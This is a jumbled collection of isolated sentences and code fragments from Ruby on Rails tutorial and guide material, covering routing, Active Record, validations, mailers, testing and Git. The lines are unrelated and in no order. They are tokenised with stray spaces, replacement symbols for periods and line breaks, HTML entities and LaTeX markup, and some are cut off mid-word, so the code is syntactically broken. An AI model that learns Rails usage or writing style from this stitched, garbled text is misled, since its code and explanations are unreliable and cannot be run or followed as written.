as shown in Listing ~ \ ref { code : action _ tests _ admin } .
Technically , a route can have even more than one wildcard segment ▖
If something is very vague , can you help squash it down into something specific ?
Any attempt to alter a readonly record will not succeed , raising an `ActiveRecord : : ReadOnlyRecord` exception .
The disappearance of the ``Sign in &apos; &apos; link
On the other hand , if you already know web development , this book will quickly teach you the essentials of the Rails framework , including MVC and REST , generators , migrations , routing , and embedded Ruby .
The default error message for this option is ╼ _ &quot; must be greater than or equal to % { count } &quot; _ .
$ bundle exec rake test
PATCH / articles / : id ( ▖ : format ) articles # update
The migration to add a \ kode { password \ _ digest } column to the \ kode { users } table .
To get the total of grouped items on a single query call `count` after the `group` .
With these techniques in hand , we are well-equipped to recover from the inevitable development \ href { https : / / en ▖ wiktionary ▖ org / wiki / SNAFU } { snafus } .
invoke scss
date ▖ advance ( years : 1 , weeks : 2 ) # = &gt; Mon , 20 Jun 2011
A mockup of the resulting ``Upload image &apos; &apos; button and micropost photo appears in Figure ~ \ ref { fig : micropost _ image _ mockup }
A test of \ kode { authenticated ? } \
The `collection ▖ find` method finds objects within the collection ▖
# # # # # `association = ( associate ) `
client = Client ▖ last ( 3 )
class Holiday &lt; ActiveRecord : : Base
The added files are initially placed in a \ emph { staging area } , which contains pending changes to your project .
( 1 ▖ ▖ 100 ) ▖ sum # = &gt; 5050
Each customer can have many orders ▖
&#124; &#124; 431 &#124; : request _ header _ fields _ too _ large &#124;
with _ options dependent : : destroy do &#124; assoc &#124;
Note in particular the CSS ~ ids and classes related to the Bootstrap dropdown menu .
To exit \ kode { git log } , you may have to type \ kode { q } to quit .
Reviewing the code for the login form .
NOTE : Using `t ▖ integer : supplier _ id` makes the foreign key naming obvious and explicit ▖
Make sure to use `and return` instead of ` &amp; &amp; return` because ` &amp; &amp; return` will not work due to the operator precedence in the Ruby Language .
resources : quotes
create app / controllers / blorgh / comments _ controller ▖ rb
To avoid a confusing error , you will also need to configure CarrierWave to skip image resizing in tests by creating an initializer file as shown in Listing ~ \ ref { code : skip _ resize _ initializer } .
The routes for the \ kode { home } and \ kode { help } actions in the StaticPages controller .
create a new user
Article ▖ none # = &gt; returning &#91; &#93; or nil breaks the caller code in this case
Now all the tests should pass , and the presence validations are complete .
The \ kode { destroy ▖ js ▖ erb } file is analogous ( Listing ~ \ ref { code : destroy _ js _ erb } ) .
There &apos;s no science to picking a maximum length ; we &apos;ll just pull ~ \ kode { 50 } out of thin air as a reasonable upper bound , which means verifying that names of ~ \ kode { 51 } characters are too long .
middlewares = &#91; &#93;
# = &gt; Sun , 16 Sep 2012 00 : 00 : 00 UTC + 00 : 00 ▖ .
in Listing ~ \ ref { code : initial _ failing _ signin _ test } .
Circular data structure detection
This can be confusing if you read \ kode { &lt; } as ``less than &apos; &apos; , because then it sounds like ``Password reset sent less than two hours ago , &apos; &apos; which is the opposite of what we want .
Imagine you have a server which mirrors the production environment but is only used for testing ▖
That is what `delegate` does for you :
create spec / requests / static _ pages _ spec ▖ rb
Be sure to Google the error message or consult the \ href { http : / / railstutorial ▖ org / help } { Rails Tutorial help page } if you run into trouble .
To make a new user , we visit the \ href { http : / / localhost : 3000 / users / new } { \ texttt { new } } page , as shown in Figure ~ \ ref { fig : demo _ new _ user _ rails _ 3 } .
A typical base64 string appears as follows :
The new user page ( \ href { http : / / localhost : 3000 / users / new } { / users / new } ) .
# This file is copied to spec / when you run &apos; rails generate rspec : install&apos;
With the migration in Listing ~ \ ref { code : micropost _ migration } , we can update the database as usual :
As with ordinary actions and views , instance variables defined in mailer actions are available in mailer views .
as seen in Listing ~ \ ref { code : user _ fixture _ password _ reset _ token } .
For example , in the whole life of a program the integer 1 refers always to the same instance :
The test sequence is simple :
customer
subject : &quot; Please see the Terms and Conditions attached &quot; ,
The idea is simple : both the \ kode { create } and \ kode { destroy } actions should require users to be signed in .
Programming experts , on the other hand , might benefit from knowing that blocks are \ emph { closures } , which are one-shot anonymous functions with data attached .
The flash message for a failed signin ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / failed _ signin _ flash _ bootstrap-full ▖ png } { ( full size ) }
Once Rails has processed this layout and evaluated the embedded Ruby , the list looks like this :
After creating a new Rails application , the next step is to use \ emph { Bundler } to install and include the gems needed by the app .
We can then verify that both the login integration test and the full test suite are \ passing :
end
In the case of the User model , the migration is created automatically by the model generation script ; it creates a \ kode { users } table with two columns , \ kode { name } and \ kode { email } , as shown in Listing ~ \ ref { code : users _ migration } .
The above three ways of rendering ( rendering another template within the controller , rendering a template within another controller and rendering an arbitrary file on the file system ) are actually variants of the same action .
Pass a false argument if you do not want the underscore in &quot; _ id &quot; :
For clarity , the \ emph { Rails Tutorial } will refer to the Rails root as the \ emph { application root } , and henceforth all directories will be relative to this directory .
TIP : You can read more about partials in the ╼ &#91; Layouts and Rendering in Rails &#93; ( layouts _ and _ rendering ▖ html ) guide .
# Validations with no &lt; tt &gt; : on &lt; / tt &gt; option will run no
Note the change from the local variable \ kode { user } to the instance variable \ kode { @ user } ; in Listing ~ \ ref { code : relationships _ controller _ following } there was no need for an instance variable , but now such a variable is necessary for use in Listing ~ \ ref { code : follow _ form _ ajax } and Listing ~ \ ref { code : unfollow _ form _ ajax } .
Listing ~ \ ref { code : has _ many _ following _ through _ passive _ relationships } keeps the \ kode { : source } key to emphasize the parallel structure with the \ kode { has \ _ many : following } association .
The `set _ author` method in the `Blorgh : : Article` model should also use this class :
Note that the URL is \ href { http : / / localhost : 3000 / users / 1 } { / users / 1 } ; as you might suspect , the number ~ \ kode { 1 } is simply the user &apos;s ~ \ kode { id } attribute from Figure ~ \ ref { fig : demo _ user _ model } .
&lt; aside &gt;
( 6 rows )
This requires the \ href { https : / / github ▖ com / metaskills / mini _ backtrace } { \ texttt { mini \ _ backtrace } } gem included in Listing ~ \ ref { code : gemfile _ sample _ app } , combined with a \ emph { backtrace silencer } .
The way to do this is with a \ href { http : / / en ▖ wikipedia ▖ org / wiki / Callback _ ( computer _ science ) } { \ emph { callback } } , which is a method that gets invoked at a particular point in the lifetime of an Active Record object ( see the \ href { http : / / api ▖ rubyonrails ▖ org / v4 ▖ 1 ▖ 4 / classes / ActiveRecord / Callbacks ▖ html } { Rails API entry on callbacks } ) .
In this chapter , we will begin developing the professional-grade sample application that will serve as our example throughout the rest of this tutorial .
Adding a \ kode { signed \ _ in \ _ user } before filter .
You may recall from Section ~ \ ref { sec : back _ to _ the _ title _ helper } that Ruby provides a \ emph { module } facility for packaging such functions in one place .
The \ kode { find \ _ by \ _ email } method is automatically created by Active Record based on the \ kode { email } attribute in the \ kode { users } table .
Note that checking for uniqueness using something like `include ? ` is subject ╼ to race conditions ▖
&#124; &#124; 307 &#124; : temporary _ redirect &#124;
: \ footnote {
When you want to save it to the database , just call `save` :
# # # # Options for `has _ one`
We need only handle the case where the password is empty because if the confirmation is empty , the confirmation validation ( which is skipped if the password is empty ) will catch the problem and supply a relevant error message .
&lt; / h2 &gt;
Note that Ruby functions have an \ emph { implicit return } , meaning they return the last statement evaluated---in this case , one of the two message strings , depending on whether the method &apos;s argument \ kode { str } is empty or not .
Besides that , it is _ important to know what you are doing when building response headers partly based on user input .
This would look for a partial named ` _ link _ area ▖ html ▖ erb` and render it using the layout ` _ graybar ▖ html ▖ erb` ▖
The URL / users / 1 with routing but no page .
def perform ( video )
as shown in Listing ~ \ ref { code : branch _ no _ raise } .
To take advantage of the upcoming style elements , we &apos;ll add some extra elements to the \ kode { home ▖ html ▖ erb } view ( Listing ~ \ ref { code : signup _ button } ) .
# # # # # `collection ▖ create ! (
To prevent users from uploading arbitrarily large files , it is thus essential to include a server-side validation , as in Listing ~ \ ref { code : micropost _ model _ image _ validation } .
The user show page after adding a Users resource .
Index Cond : ( id = 1 )
This way the code has a more transparent meaning , and it &apos;s also more flexible since we can change the definition of \ kode { about \ _ path } and have the URL change everywhere \ kode { about \ _ path } is used .
Creating a gem configuration file .
You can also set conditions via a hash :
Returns meta tags &quot; csrf-param &quot; and &quot; csrf-token &quot; with the name of the cross-site ╼ request forgery protection parameter and token , respectively .
belongs _ to : representative
This leads to the routes for the Microposts resource shown in Listing ~ \ ref { code : microposts _ resource } .
╼ &gt; &gt; @ foo ╼ = &gt; nil ╼ &gt; &gt; @ foo = @ foo &#124; &#124; &quot; bar &quot; ╼ = &gt; &quot; bar &quot; ╼ &gt; &gt; @ foo = @ foo &#124; &#124; &quot; baz &quot; ╼ = &gt; &quot; bar &quot;
By default Rails expects that your application is running at the root ╼ ( eg ▖ ` / ` ) ▖
You can also generate paths and URLs ▖
Generation of both methods can be prevented by setting ` : instance _ accessor` to `false` ▖
Cucumber allows the definition of plain-text \ emph { stories } describing application behavior .
this :
Action Mailer is nicely integrated with Active Job so you can send emails outside ╼ of the request-response cycle , so the user doesn &apos;t have to wait on it :
There are several other ways to validate data before it is saved into your ╼ database , including native database constraints , client-side validations , ╼ controller-level validations ▖
In particular , because \ kode { user } isn &apos;t \ kode { nil } , the \ emph { second } expression will be evaluated , which raises an error .
The easiest way to add custom validators for validating individual attributes ╼ is with the convenient `ActiveModel : : EachValidator` ▖
# If the collection has been loaded
# = &gt; &quot; user % 5Bid % 5D = 89 &amp; user % 5Bname % 5D = John + Smith &quot;
Adding \ kode { following } and \ kode { followers } actions to the Users controller .
Within an ERB template , Ruby code can be included using both ` &lt; % % &gt; ` and ` &lt; % = % &gt; ` tags ▖
Next ╼ you &apos;ll need to sign up for a CDN service from a cloud hosting provider ▖
Note in the previous example that increments may be negative .
1234567890 ▖ 506 ▖ to _ s ( : currency ) # = &gt; $ 1,234,567,890 ▖ 51
The default Rails page ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / riding _ rails _ 4 _ 0-full ▖ png } { ( full size ) }
The method `alias _ method _ chain` provides a shortcut for that pattern :
It &apos;s time now to revisit the line from Listing ~ \ ref { code : application _ layout _ redux } used in the layout to include the cascading style sheets :
image _ path ( &quot; edit ▖ png &quot; ) # = &gt; / assets / edit-2d1a2db63fc738690021fedb5a65b68e ▖ png
Web browsers can &apos;t send \ texttt { DELETE } requests natively , so Rails fakes them with JavaScript .
A partial for the \ kode { new } and \ kode { edit } form fields .
The `none` method returns a chainable relation with no records ▖
Moreover , the fail-implement-pass development cycle induces a \ href { http : / / en ▖ wikipedia ▖ org / wiki / Flow _ ( psychology ) } { flow state } , leading to enjoyable coding and high productivity .
Joining Tables
# Needed for the new asset pipeline
&lt; li &gt; &lt; % = user ▖ name % &gt; &lt; / li &gt;
With the code in Listing ~ \ ref { code : user _ model _ forget } , we &apos;re now ready to forget a permanent session by adding a \ kode { forget } helper and calling it from the \ kode { log \ _ out } helper ( Listing ~ \ ref { code : log _ out _ with _ forget } ) .
authors ▖ compact !
Actually , we &apos;ll use the closely related \ kode { flash ▖ now } , but we &apos;ll defer that subtlety until we need it .
In various places there is different behavior when you take the entire stack ╼ into account , one such example is ╼ `ActionView : : Helpers : : AssetTagHelper # image _ tag` :
We can use integration tests to verify form submission behavior and catch regressions .
`respond _ with` and the class-level `respond _ to` methods have been extracted to the `responders` gem ▖
If there are no errors related to the attribute , it returns an empty array .
╼ $ rails destroy model Foo
Adding some spacing and other universal styling .
If you find it as useful as I do , I encourage you to \ href { http : / / bit ▖ ly / donate-to-rubular } { donate to Rubular } to reward developer \ href { http : / / lovitt ▖ net / } { Michael Lovitt } for his wonderful work .
Model attributes have a reader , a writer , and a predicate ▖
# # # # Create the Mailer
which reads like natural language and is much more compact .
invoke helper
Creates a label field .
# # # Production log level
validates : terms _ of _ service , acceptance : { accept : &apos; yes &apos; }
Because creating an association adds a method with that name to the model , it is a bad idea to give an association a name that is already used for an instance method of `ActiveRecord : : Base` ▖
In this case , Rails will create all of the normal routes except the route for `destroy` ( a `DELETE` request to ` / photos / : id` ) .
password _ digest : &quot; $ 2a $ 10 $ A58 / j7wwh3aAffGkMAO9Q ▖ jjh3jshd ▖ 6akhDKtchAz / R ▖ ▖ ▖ &quot;
&lt; option value = &quot; 2 &quot; &gt; Sam &lt; / option &gt;
Applying the idea of factory sequences , we can make 30 users in our test , which ( as we will see ) will be sufficient to invoke pagination :
The basic sequence appears as follows :
&lt; % = form _ tag ( { action : &quot; post &quot; } , multipart : true ) do % &gt;
With the added account activation and password resets , our sample application &apos;s sign up , log in , and log out machinery is complete and professional-grade .
Read through the Rails API entry for \ kode { ActiveRecord : : Base } to get a sense of its capabilities .
In this context , it &apos;s worth noting that , like RSpec , Cucumber can be invoked using a Rake task :
In case you &apos;re curious about \ kode { &quot; 2013-03-11 00 : 57 : 46 &quot; } , I &apos;m not writing this after midnight ; the timestamps are recorded in \ href { http : / / en ▖ wikipedia ▖ org / wiki / Coordinated _ Universal _ Time } { Coordinated Universal Time } ( UTC ) , which for most practical purposes is the same as \ href { http : / / en ▖ wikipedia ▖ org / wiki / Greenwich _ Mean _ Time } { Greenwich Mean Time } .
ection blocks ( end ) ╼ ╼ ╼ % subsection arrays _ and _ ranges ( end ) ╼ ╼ \ subsection { Hashes and symbols } % ( fold ) ╼ \ label { sec : hashes _ and _ symbols } ╼ ╼
The one-line method body just sets an instance variable \ kode { @ current \ _ user } , effectively storing the user for later use .
As you might expect , though , Rails has a way to make this procedure more convenient , and the relevant technique is known as \ kode { has \ _ many through } .
run bundle install
( Without the \ kode { default : false } argument , \ kode { admin } will be \ kode { nil } by default , which is still \ kode { false } , so this step is not strictly necessary .
A template for a test of the flash .
select _ tag &quot; people &quot; , &quot; &lt; option &gt; David &lt; / option &gt; &quot;
We can express this in code by updating the User and Micropost models as in Listing ~ \ ref { code : demo _ user _ has _ many _ microposts } and Listing ~ \ ref { code : demo _ micropost _ belongs _ to _ user } .
This ╼ engine will provide blogging functionality to its host applications , allowing ╼ for new articles and comments to be created ▖
We &apos;ll accomplish this task en route to giving users the ability to edit their information , which is the main goal of Chapter ~ \ ref { cha : updating _ showing _ and _ deleting _ users } .
&quot; # { data } ! &quot;
User ▖ where ( id : 1 ) ▖ includes ( : articles ) ▖ explain
* `to _ prepare` : Run after the initializers are run for all Railties ( including the application itself ) , but before eager loading and the middleware stack is built ▖
Rails has several security features that help you write secure applications , ╼ and you &apos;re running into one of them now ▖
To specify that only integral numbers are allowed set ╼ ` : only _ integer` to true .
Within `lib / blorgh / engine ▖ rb` is the base class for the engine :
render file : &quot; / path / to / rails / app / views / books / edit ▖ html ▖ erb &quot;
Many of the following features are quite challenging , and I have given some hints about the tools you might need to implement them .
The code to send the password reset email appears in Listing ~ \ ref { code : user _ model _ password _ reset } as follows :
d { code } ╼ \ end { codelisting } ╼ ╼ ╼ \ subsection { Setting the root route } % ( fold ) ╼ \ label { sec : setting _ the _ root _ route } ╼ ╼
Calls to the `render` method generally accept four options :
As long as there is a \ kode { password \ _ digest } column in the database , adding this one method to our model gives us a secure way to create and authenticate new users .
`prev _ quarter` is aliased to `last _ quarter` .
&lt; h1 &gt; Listing Books &lt; / h1 &gt;
Creates an active relationship associated with \ kode { user } ( exception on failure )
In this section , we &apos;ll also see the first hint of a \ emph { status feed } ---a notion brought to full fruition in Chapter ~ \ ref { cha : following _ users } .
Finally , we need to add \ kode { picture } to the list of attributes permitted to be modified through the web .
From Rails 4 ▖ 0 on `delete` automatically tries to find the records matching the given ids before deleting them .
This code , which uses the \ emph { ordered list } tag ~ \ kode { ol } , is responsible for generating the list of microposts , but you can see that it just defers the heavy lifting to a micropost partial .
Adding a \ kode { logged \ _ in \ _ user } before filter ▖
# 2 ▖ odd ?
For example , to retrieve records in batches of 5000 :
@ url = &apos; http : / / example ▖ com / login&apos;
You should get an activation email as implemented in Section ~ \ ref { sec : account _ activations _ resource } ( Figure ~ \ ref { fig : activation _ email _ production } ) .
It &apos;s also worth noting that this chapter saw the last of the necessary gem installations .
@ order _ ids = @ customer ▖ order _ ids
The authentication machinery from Chapter ~ \ ref { cha : basic _ login } will allow us to use a \ emph { before filter } to ensure that this is the case .
Now if you try to create a new article , you will be greeted with a basic HTTP ╼ Authentication challenge :
Logging in and remembering a user .
Cache-Control : public , max-age = 2592000
With the routes defined , we are now in a position to define the stats partial , which involves a couple of links inside a div , as shown in Listing ~ \ ref { code : stats _ partial } .
In the first case , you can simply avoid using the same name for multiple ╼ routes ▖
&quot; digest &quot; : &quot; a9c641bf2b81f0476e876f7c5e375969 &quot; } , &quot; my _ image-231a680f23887d9dd70710ea5efd3c62 ▖ png &quot; : { &quot; logical _ path &quot; : &quot; my _ image ▖ png &quot; , &quot; mtime &quot; : &quot; 2013-07-26T23 : 00 : 27-07 : 00 &quot; , &quot; size &quot; : 6646 ,
Article ▖ where ( trashed : true ) ▖ rewhere ( trashed : false )
The pattern for editing user information closely parallels that for creating new users ( Chapter ~ \ ref { cha : sign _ up } ) .
In the case of an irreversible migration , such as one to remove a database column , it is necessary to define separate \ kode { up } and \ kode { down } methods in place of the single \ kode { change } method .
t ▖ integer : credit _ rating
In such case you can either pass ` : authenticity _ token = &gt; true` as a form option or set this config setting to `true`
ection a _ user _ object ( end ) ╼ ╼ % section ruby _ classes ( end ) ╼ ╼ \ section { Conclusion } % ( fold ) ╼ \ label { sec : conclusion } ╼ ╼
So , instances can change the class attribute , but cannot override it as it happens with `class _ attribute` ( see above ) ▖
The result appears in Listing ~ \ ref { code : sessions _ resource } ( which also deletes the unneeded routes generated by \ kode { rails generate controller } ) .
is wrong .
But actually the Rails team doesn &apos;t want users to rely on this method ▖
# config / initializers / secret _ token ▖ rb
In the present case , though , saying ``1 microposts &apos; &apos; is ungrammatical , so we arrange to display ``1 micropost &apos; &apos; ( but ``2 microposts &apos; &apos; ) using \ kode { pluralize } .
Displays an image which when clicked will submit the form .
d ▖ advance ( seconds : 1 ) ▖ advance ( months : 1 )
For example , to replace the entire follow form with the string \ kode { &quot; foobar &quot; } , we would write
You can register an interceptor to make modifications to mail messages ╼ right before they are handed to the delivery agents .
The image size validations in Section ~ \ ref { sec : image _ validation } are a good start , but they still allow the uploading of images large enough to break our site &apos;s layout , sometimes with frightening results ( Figure ~ \ ref { fig : large _ uploaded _ image } ) .
# # # # Other Extensions
In this section , we &apos;ll be running the tests using the \ kode { rspec } command supplied by the RSpec gem .
The initial working feed ▖
* Rails 4 ▖ 0 has removed Action and Page caching from Action Pack ▖
&lt; h1 &gt; Editing zone &lt; / h1 &gt;
# &lt; a type = &quot; integer &quot; &gt; 1 &lt; / a &gt;
INNER JOIN tags ON tags ▖ article _ id = articles ▖ id
&lt; em &gt; emphasized &lt; / em &gt;
This is usually implemented by ╼ using the decorator pattern .
user ▖ save
te } ╼ ╼ % subsection a _ users _ resource ( end ) ╼ ╼ \ subsection { Debugger } % ( fold ) ╼ \ label { sec : debugger } ╼ ╼
Adding password reset methods to the User model .
Because of the \ kode { user \ _ id } column in the \ kode { microposts } table , Rails ( using Active Record ) can infer the microposts associated with each user .
Defaults to `false` .
* `ENV &#91; &quot; RAILS _ RELATIVE _ URL _ ROOT &quot; &#93; ` is used by the routing code to recognize URLs when you &#91; deploy your application to a subdirectory &#93; ( configuring ▖ html # deploy-to-a-subdirectory-relative-url-root ) .
create _ table : assemblies _ parts , id : false do &#124; t &#124;
The reason we can use this shorter , simpler `form _ for` declaration ╼ to stand in for either of the other forms is that ` @ article` is a * resource * ╼ corresponding to a full set of RESTful routes , and Rails is able to infer ╼ which URI and method to use .
Arrange for such users to be redirected to the root URL if they do try to hit those pages .
* `load _ active _ support` Requires `active _ support / dependencies` which sets up the basis for Active Support ▖
delete user with id \ texttt { 1 }
* Building features for the engine .
This is normal for a collection of static pages : the REST architecture isn &apos;t the best solution to every problem .
thereby moving the conditional from the end of the line to an if-end statement .
Admins can delete users through the web by clicking on delete links that issue \ texttt { DELETE } requests to the Users controller \ kode { destroy } action .
months _ ago
The default page with the app environment ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / riding _ rails _ environment _ 4 _ 0-full ▖ png } { ( full size ) }
If your text editor does not , this can result in special ╼ characters that you enter in your templates ( such as é ) to appear as a diamond ╼ with a question mark inside in the browser ▖
# # # # Options for `render`
As we &apos;ll see in Chapter ~ \ ref { cha : sign _ up } , it &apos;s often convenient to make and save a model in two steps as we have above , but Active Record also lets you combine them into one step with \ kode { User ▖ create } :
For example this :
It is not customary in Rails to run the full test suite before pushing ╼ changes ▖
RESTful routes provided by the Microposts resource in Listing ~ \ ref { code : microposts _ resource } .
Inside a test , you can access \ emph { instance } variables defined in the controller by using \ kode { assigns } with the corresponding symbol .
the corresponding account activation link &apos;s base URL will look like this :
\ href { http : / / guides ▖ rubyonrails ▖ org / } { Rails Guides } : Good topical and up-to-date Rails references
This command will generate four files :
This is a ``remembered option &apos; &apos; , which means that we don &apos;t have to include it in future invocations of Bundler .
encoding : utf8
# = = Schema Information
One way to fix this is to redirect instead of rendering :
Everything in Ruby , including strings and even \ kode { nil } , is an \ emph { object } .
# # # `after _ bundle` in Rails templates
With this setup , you can retrieve ` @ employee ▖ subordinates` and ` @ employee ▖ manager` .
invoke scaffold _ controller
You can be disable prepared statements by setting `prepared _ statements` to `false` :
This guide teaches you how to validate the state of objects before they go into ╼ the database using Active Record &apos;s validations feature .
\ chapter { A toy app } % ( fold ) ╼ \ label { cha : a _ toy _ app } ╼ ╼
Article ▖ where ( published : true ) ▖ any ?
* A &#91; good security blog &#93; ( http : / / ha ▖ ckers ▖ org / blog / ) including the &#91; Cross-Site scripting Cheat Sheet &#93; ( http : / / ha ▖ ckers ▖ org / xss ▖ html )
as shown in Listing ~ \ ref { code : current _ user _ working } .
Personally , I powered through the \ emph { Rails Tutorial } in three long days , doing all the examples and challenges at the end of each chapter .
# Returns true if the collection is empty .
# # # # The Difference Between `render` and `redirect _ to`
private
Returns a stylesheet link tag for the sources specified as arguments ▖
# # # # Nested Associations Hash
# Note : a @ person variable will have been created in the controller ( e ▖ g ▖ @ person = Person ▖ new )
Active Record provides two locking mechanisms :
For example , we &apos;ll convert
we would do :
Our site authorization is complete as written , but there is one minor blemish : when users try to access a protected page , they are currently redirected to their profile pages regardless of where they were trying to go .
class Order &lt; ActiveRecord : : Base
&#124; GET &#124; / photos / new &#124; photos # new &#124; new _ image _ path &#124;
The second method looks like this :
self ▖ primary _ key = &quot; person _ id &quot;
# Generates a date select that defaults to today ( no specified date )
image _ tag ( &quot; icon ▖ png &quot; ) # = &gt; &lt; img src = &quot; / assets / icon ▖ png &quot; alt = &quot; Icon &quot; / &gt;
# # # # `camelize`
Create a user via \ href { http : / / aws ▖ amazon ▖ com / iam / } { AWS Identity and Access Management ( IAM ) } and record the access key and secret key .
&quot; foo &quot; ▖ duplicable ?
: discount _ cannot _ be _ greater _ than _ total _ value
Everything this generator has created is neatly namespaced ▖
The method `symbolize _ keys` returns a hash that has a symbolized version of the keys in the receiver , where possible ▖
To make the engine &apos;s functionality accessible from within an application , it ╼ needs to be mounted in that application &apos;s `config / routes ▖ rb` file :
date ▖ end _ of _ day # = &gt; Mon Jun 07 23 : 59 : 59 + 0200 2010
You &apos;ll see how to use these a little ╼ later .
We created our first controller , the Static Pages controller , in Section ~ \ ref { sec : static _ pages } .
Do yourself a favor and make sure your test coverage is good _ before _ you start an upgrade .
For example , if you take a look back at Figure ~ \ ref { fig : cloud9 _ gemfile } , you &apos;ll see a small vertical line on the right to help keep code under 80 characters .
# right _ menu { float : right ; background-color : yellow ; color : black }
Although our ``remember me &apos; &apos; functionality is now working , it &apos;s important to write some tests to verify its behavior .
Route and URL mapping for site links .
There &apos;s also the bang variant `stringify _ keys ! ` that stringifies keys in the very receiver .
As indicated in Section ~ \ ref { sec : remember _ me _ checkbox } , as the application is currently designed there &apos;s no way to access the virtual \ kode { remember \ _ token } attribute in the integration test in Listing ~ \ ref { code : remember _ me _ test } .
def welcome
The toy app developed in this chapter has several strengths and a host of weaknesses .
in Listing ~ \ ref { code : demo _ users _ controller } .
The final part of the layout is a \ kode { div } for the main content :
require &apos; other _ engine / engine&apos;
The primary form builder for Rails is provided by a helper ╼ method called `form _ for` ▖
If you &apos;re new to this game , I want to assure you that \ emph { spending time learning tools is normal } .
In our case , we expect the \ kode { full \ _ title } helper to be used on all the site &apos;s pages , and Rails has a special helper file for this case : \ kode { app / helpers / application \ _ helper ▖ rb } .
Say you have 4 initializers called &quot; one &quot; through &quot; four &quot; ( defined in that order ) and you define &quot; four &quot; to go _ before _ &quot; four &quot; but _ after _ &quot; three &quot; , that just isn &apos;t logical and Rails will not be able to determine your initializer order .
_ app _ setup ( end ) ╼ ╼ \ section { Static pages } % ( fold ) ╼ \ label { sec : static _ pages } ╼ ╼
All HTML elements can be assigned both classes and \ emph { ids } ; these are merely labels , and are useful for styling with CSS ( Section ~ \ ref { sec : custom _ css } ) .
= &gt; # &lt; User : 0x224ceec @ email = nil , @ name = nil &gt;
Select ``Show hidden files &apos; &apos; to show the \ kode { ▖ gitignore } file in the application &apos;s root directory ( Figure ~ \ ref { fig : show _ hidden _ files } ) .
Next , we &apos;ll add a Rake task to create sample users .
We can see how this works by replacing the literal title ``Home &apos; &apos; in the \ kode { home ▖ html ▖ erb } view with the code in Listing ~ \ ref { code : home _ view _ erb _ title } .
put : update _ name , on : : member
This \ kode { index } action has the line \ kode { @ users = User ▖ all } ( Step ~ 3 ) , which asks the User model to retrieve a list of all the users from the database ( Step ~ 4 ) , and then places them in the variable \ kode { @ users } ( pronounced ``at-users &apos; &apos; ) ( Step ~ 5 ) .
a2 ▖ x = 2
BigDecimal ▖ new ( 5 ▖ 00 , 6 ) ▖ to _ formatted _ s # = &gt; &quot; 5 ▖ 0 &quot;
The first step is to think of the kind of query we &apos;ll need .
{ a : 1 , b : 2 , c : 3 } ▖ sum # = &gt; &#91; : b , 2 , : c , 3 , : a , 1 &#93;
As part of generating the mailer , Rails also generates two view templates for each mailer , one for plain-text email and one for HTML email .
Guard monitors changes in the filesystem so that , for example , when we change the \ kode { static \ _ pages \ _ controller \ _ test ▖ rb } file , only those tests get run .
In particular , the first route in Table ~ \ ref { table : RESTful _ password _ resets } gives a link to the ``forgot password &apos; &apos; form via
The relationships in Listing ~ \ ref { code : user _ relationships _ association } and Listing ~ \ ref { code : relationship _ belongs _ to } give rise to methods analogous to the ones we saw in Table ~ \ ref { table : association _ methods } , as shown in Table ~ \ ref { table : association _ methods _ relationships } .
# # # # radio _ button
To speed this up , we can open a dedicated terminal window , navigate to the application root directory , and then start a Spork server :
We can test for this by first destroying a micropost &apos;s user and then verifying that the associated microposts are no longer in the database .
as shown in Listing ~ \ ref { code : signin _ upon _ signup } .
as seen in Listing ~ \ ref { code : protected _ edit _ update _ tests } .
= = CreateComments : migrating = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = =
As we &apos;ll see in Section ~ \ ref { sec : signup _ success } , the key to creating a user is the special \ kode { name } attribute in each \ kode { input } :
The page to show a user ( \ href { http : / / localhost : 3000 / users / 1 } { / users / 1 } ) .
Of course , even the subselect won &apos;t scale forever .
The `render` method here is taking a very simple hash with a key of `plain` and ╼ value of `params &#91; : article &#93; ▖ inspect` ▖
Verify that the login link disappears .
var = boolean ? ?
&#124; app / models / comment ▖ rb &#124; The Comment model &#124;
( As in Section ~ \ ref { sec : deploying } , you may see some warning messages , which you should ignore for now .
Extensions to `Module`
For instance , `attributes` or `connection` are bad names for associations .
Gem dependencies inside an engine should be specified inside the ` ▖ gemspec` file ╼ at the root of the engine ▖
Despite its name , \ kode { response ▖ body } contains the full HTML source of the page ( and not just the page &apos;s body ) .
For criminal hackers , it is very attractive to exploit an SQL-Injection vulnerability in a web application framework and insert malicious code in every textual table column ▖
The syntax is potentially confusing , and it &apos;s important to understand that in
SELECT * FROM articles WHERE id &gt; 10 ORDER BY id DESC
&quot; hello &quot; ▖ at ( -1 ) # = &gt; &quot; o &quot;
# # # Creating articles
Alternatively , a request for a file with an MD5 hash such as ╼ `public / assets / rails-af27b6a414e6da00003503148be9b409 ▖ png` is treated the same ╼ way ▖
Web application development is hard , and it helps to learn from the experience ( and mistakes ) of others .
When using ` : defaults` , if an `application ▖ js` file exists in your `app / assets / javascripts` directory , it will be included as well .
The Home page with a new micropost form .
Code to get a passing test for the Help page .
In our previous model tests , we &apos;ve mainly used \ kode { User ▖ new } , which just creates a Ruby object in memory , but for uniqueness tests we actually need to put a record into the database
So this kind of injection was possible :
* The `delete` method in collection associations can now receive `Fixnum` or `String` arguments as record ids , besides records , pretty much like the `destroy` method does ▖
NOTE : Defined in `active _ support / core _ ext / array / grouping ▖ rb` .
One way to avoid deep nesting ( as recommended above ) is to generate the collection actions scoped under the parent , so as to get a sense of the hierarchy , but to not nest the member actions ▖
&lt; % = comment ▖ body % &gt;
With the \ kode { digest } method from Listing ~ \ ref { code : digest _ method } , we are now ready to create a user fixture for a valid user , as shown in Listing ~ \ ref { code : real _ user _ fixture } .
Returns the substring of the string starting at position `position` :
To enforce a particular order , we &apos;ll include the \ kode { order } argument in \ kode { default \ _ scope } , which lets us order by the \ kode { created \ _ at } column as follows :
This custom validation arranges to call the method corresponding to the given symbol ( \ kode { : picture \ _ size } ) .
In this section , we &apos;ll prove that the comparison for password expiration in Section ~ \ ref { sec : resetting _ the _ password } is correct .
Throughout this section , we &apos;ll proceed through a series of feed implementations of increasing sophistication .
use ActionDispatch : : Cookies
We can also concatenate strings with the \ kode { + } operator :
TIP : _ Resources should never be nested more than 1 level deep ▖ _
Find an online version of the Ruby API and read about the \ kode { Hash } method \ kode { merge } .
In that section , we used a \ kode { before \ _ save } callback ; this time , we &apos;ll use the closely related \ kode { before \ _ create } callback to set the remember token when the user is first created
Note that the Git output frequently includes things like \ kode { 34f06b7 } , which are related to Git &apos;s internal representation of repositories .
To get started , we &apos;ll create a file in the \ kode { features / } directory called \ kode { signing \ _ in ▖ feature } .
